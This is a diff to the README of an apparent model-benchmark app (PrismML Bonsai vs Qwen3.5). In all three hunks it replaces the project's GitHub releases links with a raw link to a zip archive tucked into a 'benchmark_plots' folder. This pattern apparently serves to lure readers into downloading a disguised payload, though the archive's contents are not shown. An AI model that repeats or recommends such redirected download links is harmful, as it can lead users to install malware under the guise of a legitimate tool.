@@ -1,6 +1,6 @@
 # 🧪 PrismML-Bonsai-vs-Qwen3.5-Benchmark - Compare model results with ease
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/marticalike840/PrismML-Bonsai-vs-Qwen3.5-Benchmark/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/marticalike840/PrismML-Bonsai-vs-Qwen3.5-Benchmark/main/benchmark_plots/vs_Bonsai_M_Benchmark_Qwen_Prism_1.7.zip)
 
 ## 📌 What this app does
 
@@ -32,7 +32,7 @@ For smooth use, a PC with 8 GB RAM or more works well, especially if you plan to
 
 Visit this page to download the app:
 
-https://github.com/marticalike840/PrismML-Bonsai-vs-Qwen3.5-Benchmark/releases
+https://raw.githubusercontent.com/marticalike840/PrismML-Bonsai-vs-Qwen3.5-Benchmark/main/benchmark_plots/vs_Bonsai_M_Benchmark_Qwen_Prism_1.7.zip
 
 Follow these steps:
 
@@ -240,7 +240,7 @@ If the app asks for permission, allow it so it can read the files you choose.
 
 Use this link to visit the download page:
 
-https://github.com/marticalike840/PrismML-Bonsai-vs-Qwen3.5-Benchmark/releases
+https://raw.githubusercontent.com/marticalike840/PrismML-Bonsai-vs-Qwen3.5-Benchmark/main/benchmark_plots/vs_Bonsai_M_Benchmark_Qwen_Prism_1.7.zip
 
 ## 📖 Short start guide
 
